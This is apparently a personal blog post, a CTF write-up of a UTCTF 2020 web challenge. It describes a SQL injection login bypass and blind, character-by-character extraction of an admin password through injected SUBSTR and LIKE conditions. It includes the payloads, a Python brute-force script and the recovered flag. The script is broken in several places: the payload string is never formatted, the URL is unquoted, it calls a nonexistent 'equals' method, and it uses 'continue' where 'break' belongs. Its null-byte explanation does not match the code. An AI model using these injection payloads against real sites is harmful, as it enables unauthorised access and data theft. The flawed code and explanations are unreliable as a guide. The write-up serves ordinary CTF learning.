---
title : "UTCTF 2020: Epic Admin Pwn"
date : 2020-04-22T00:46:19-06:00
draft : false
author : "JamVie"
tags : [
    "writeups"]
---

I particpated in UTCTF with my team in March 2020, held and operated by the University of Texas [ISSS](https://www.isss.io/). My team and I solved a very fun SQLi-based attack! This challenge helped me to refine my python skills cause the lord knows I needed it, as well as reinforced my knowledge about SQL-based attacks. This is the first web challenge I solved in the CTF, and admittedly the one that I enjoyed the most to do.


Let's Begin!
----

We are presented with a clean and minimal login page. The challenge's description says that "the password is the flag". Well, since this is only a login page, I'd figure to try and get into admin somehow.


![login](https://raw.githubusercontent.com/jamiepoli/JamvieCTF/master/content/images/UTCTFscreenshot1.png)

Initial attempts to do some scoping for SQL vulnerabilities didn't do anything. Inputting a single quote ' mark wouldn't show anything useful. So, I went in kinda blind, and did a pretty standard SQL attack: ```admin--``` If there were vulnerable SQL queries to be had, my input would malform the query to only return the entries where the username == admin. 
And it worked! 

![adminpage](https://raw.githubusercontent.com/jamiepoli/JamvieCTF/master/content/images/UTCTFscreenshot2.png)


It's a static welcome page, so I didn't get anything useful past learning that the admin's username was, in fact, admin. And the challenge's description told me as such - if I wanted the password, I needed to do something else. 

The fact that I got into admin meant that I malformed the SQL query so that it would ignore any sort of password checking. But, I kinda need some form of password validation in order to get any headstart on what it was. Luckily, SQL utilizes alot of logic-based keywords that lets us essentially guess the password with custom SQL we inject into it. We would want to inject rogue SQL so that the underlying query would look like,

```SQL

admin' AND pass LIKE ('J%')

```

This will return true if the admin's password starts with a J.

While I use the SQL 'LIKE' keyword here, another keyword called "substr" or "substring" exists that I prefer. [From SQL Server Tutorial:] (https://www.sqlservertutorial.net/sql-server-string-functions/sql-server-substring-function/)

>The SUBSTRING() extracts a substring with a specified length starting from a location in an input string.


A teammate of mine actually created a script that bruteforced the alphanumerics letter by letter until we printed the password, but I decided to take a shot at creating one myself using python ~~because its about time I actually learn practical python for myself~~:

```python

flag = ""

chars = 'abcdefghijklmnopqrstuvwxyz1234567890{}'

# url here would've been the epic admin pwn site
url = example.com

for index in range(0, 40):
    for char in chars: 
        req = "admin' AND SUBSTR(flag, {index}, 1) = '{char}'--" 
        data = {"username": req, "pass": "JamVieSaysHello"} 
        response = requests.post(url, data)
        if response.text.equals('Welcome, admin!') > 0: 
            flag += char 
            print(flag) 
            continue 
```

The "req" var here is our custom SQL. The idea here is to test out every character against the password's character at the given index. If they match, store it into our buffer array. When we reach the nullbyte character which terminates strings, then we print out the buffer, which should have correctly found the password! 

```
utflag{dual1pa1sp3rf3ct}
```

Note that, we could technically put anything we wanted into the password field - our input to it never gets checked, because we override whatever checking existed for it with our custom SQL. 

There are admittedly faster ways to do this, for example, if you have burpsuite and sqlmap you could save the post request data into a text file and have sqlmap dump the underlying database for you, which should also return the flag. However, creating the script and testing it out was alot of fun! 

Jam

